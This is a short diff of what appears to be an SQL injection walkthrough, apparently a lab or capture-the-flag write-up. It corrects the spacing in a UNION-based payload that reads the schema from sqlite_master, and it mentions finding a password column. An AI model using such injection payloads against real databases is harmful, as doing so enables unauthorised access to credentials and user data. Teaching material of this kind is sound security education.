@@ -13,7 +13,7 @@ our quey looks like this   ``` $query = 'SELECT id,username FROM users WHERE id=
  
 * Finding   tables and columns names (table_name and col.. from information schema )
 
-      1 AND 1=0 UNION ALLselect 1,sql from sqlite_master -- '
+      1 AND 1=0 UNION ALL select 1,sql from sqlite_master -- '
  
  and i found a column called password , let's find if any intresting there 
  
